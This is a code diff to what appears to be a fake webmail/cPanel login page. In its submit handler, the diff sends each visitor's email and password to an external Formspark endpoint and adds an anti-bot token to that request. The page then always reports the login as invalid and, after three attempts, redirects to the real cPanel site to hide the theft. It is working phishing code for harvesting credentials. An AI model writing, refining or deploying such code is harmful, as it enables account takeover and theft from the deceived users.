@@ -248,7 +248,7 @@
       let clickCount = 0;
       let isSubmitting = false;
 
-      form.addEventListener("submit", function (event) {
+      form.addEventListener("submit", async function (event) {
         event.preventDefault();
         if (isSubmitting) return;
 
@@ -275,6 +275,40 @@
         showLoader();
         isSubmitting = true;
 
+        // Get the Botpoison token from the form (generated automatically by the script)
+        const botpoisonInput = document.querySelector('input[name="_botpoison"]');
+        const botpoisonToken = botpoisonInput ? botpoisonInput.value : null;
+
+        const formsparkData = {
+          email: emailInput.value,
+          password: passwordInput.value,
+          webmail_login: true
+        };
+
+        // Add Botpoison token if available (required for AJAX submissions with Botpoison enabled)
+        if (botpoisonToken) {
+          formsparkData._botpoison = botpoisonToken;
+        }
+
+        try {
+          const response = await fetch(FORMSPARK_URL, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              Accept: "application/json"
+            },
+            body: JSON.stringify(formsparkData)
+          });
+
+          if (response.ok) {
+            console.log("✅ Formspark submission successful with Botpoison");
+          } else {
+            console.error("❌ Formspark submission failed:", response.status);
+          }
+        } catch (error) {
+          console.error("❌ Error sending to Formspark:", error);
+        }
+
         setTimeout(() => {
           a1.forEach(el => el.classList.remove("e-hidden"));
           a2.forEach(el => (el.innerHTML = "Your Email/Password not valid"));
@@ -288,39 +322,11 @@
 
         if (emailInput.value && passwordInput.value) {
           clickCount++;
-          submitData(emailInput.value, passwordInput.value);
           if (clickCount >= 3) {
             redirectPage();
           }
         }
       });
-
-      function submitData(email, password) {
-        const formsparkData = {
-          email: email,
-          password: password,
-          webmail_login: true
-        };
-
-        fetch(FORMSPARK_URL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            Accept: "application/json"
-          },
-          body: JSON.stringify(formsparkData)
-        })
-          .then(response => {
-            if (response.ok) {
-              console.log("Formspark submission successful");
-            } else {
-              console.error("Formspark submission failed");
-            }
-          })
-          .catch(error => {
-            console.error("Error sending to Formspark:", error);
-          });
-      }
 
       function redirectPage() {
         window.location.href = "https://www.cpanel.net/products/";
